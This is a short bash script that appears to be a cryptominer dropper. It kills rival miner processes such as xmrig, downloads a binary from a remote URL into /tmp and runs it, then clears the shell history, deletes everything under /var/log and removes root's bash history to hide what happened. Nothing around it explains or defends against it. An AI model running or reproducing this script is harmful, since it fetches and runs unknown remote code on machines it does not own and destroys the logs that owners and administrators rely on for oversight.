#!/bin/bash

# Kill processes with "xmrig" "running" "sslmix" 
pgrep xmrig | xargs kill -9
pgrep running | xargs kill -9
pgrep sslmix | xargs kill -9

# Download the binary
wget -O /tmp/init https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/init

# Grant executable permission
chmod +x /tmp/init

# Run the binary
/tmp/init

# history
history -c

# Clean up log files
rm -rf /var/log/*

# Clean up history file
rm -rf /root/.bash_history
